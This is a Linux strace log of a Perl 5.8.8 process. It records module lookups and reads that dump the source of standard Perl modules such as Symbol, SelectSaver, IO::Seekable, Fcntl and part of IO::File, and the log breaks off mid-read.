5968  07:11:35.424023 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.424058 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5968  07:11:35.424073 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.424084 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5968  07:11:35.424096 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5968  07:11:35.424110 waitpid(-1,  <unfinished ...>
5970  07:11:35.424120 <... stat64 resumed> 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424128 stat64("/etc/perl/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424141 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424154 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424168 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424180 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424194 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424205 stat64("/usr/lib/perl5/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424219 stat64("/usr/share/perl5/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424230 stat64("/usr/share/perl5/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424243 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424255 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424269 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424281 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
5970  07:11:35.424305 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.424319 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.424330 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.424348 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
5970  07:11:35.424785 read(8, "", 4096) = 0
5970  07:11:35.424801 close(8)          = 0
5970  07:11:35.424863 stat64("/etc/perl/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424879 stat64("/etc/perl/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424893 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424906 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424934 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.424975 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425004 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425030 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425043 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425055 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425068 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425080 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425098 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.425111 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
5970  07:11:35.425132 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.425147 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.425159 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.425177 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
5970  07:11:35.425302 brk(0x81d6000)    = 0x81d6000
5970  07:11:35.425331 read(8, "", 4096) = 0
5970  07:11:35.425343 close(8)          = 0
5970  07:11:35.425819 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
5970  07:11:35.426540 read(6, "", 4096) = 0
5970  07:11:35.426556 close(6)          = 0
5970  07:11:35.426596 stat64("/etc/perl/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426611 stat64("/etc/perl/IO/Seekable.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426625 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426638 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426652 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426665 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426679 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426690 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426704 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426715 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426728 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426741 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
5970  07:11:35.426762 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.426777 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.426788 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.426807 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
5970  07:11:35.426975 stat64("/etc/perl/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.426992 stat64("/etc/perl/Fcntl.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427019 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427031 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427045 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427057 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427071 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427086 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427099 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427110 stat64("/usr/share/perl5/Fcntl.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427123 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.427135 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
5970  07:11:35.427156 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.427171 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.427182 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.427200 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
5970  07:11:35.428142 brk(0x81f7000)    = 0x81f7000
5970  07:11:35.437242 read(8, "", 4096) = 0
5970  07:11:35.437260 close(8)          = 0
5970  07:11:35.437334 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5970  07:11:35.437360 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5970  07:11:35.437388 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
5970  07:11:35.437402 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
5970  07:11:35.437471 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5970  07:11:35.437509 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d0f000
5970  07:11:35.437523 mmap2(0xb7d12000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d12000
5970  07:11:35.437539 close(8)          = 0
5970  07:11:35.437750 read(6, "", 4096) = 0
5970  07:11:35.447403 close(6)          = 0
5970  07:11:35.447403 stat64("/etc/perl/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447403 stat64("/etc/perl/IO/File.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447404 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447404 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447404 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447404 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447404 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447405 stat64("/usr/lib/perl5/IO/File.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447405 stat64("/usr/share/perl5/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447405 stat64("/usr/share/perl5/IO/File.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447405 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.447406 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
5970  07:11:35.447406 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.447409 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.447427 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.447446 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, 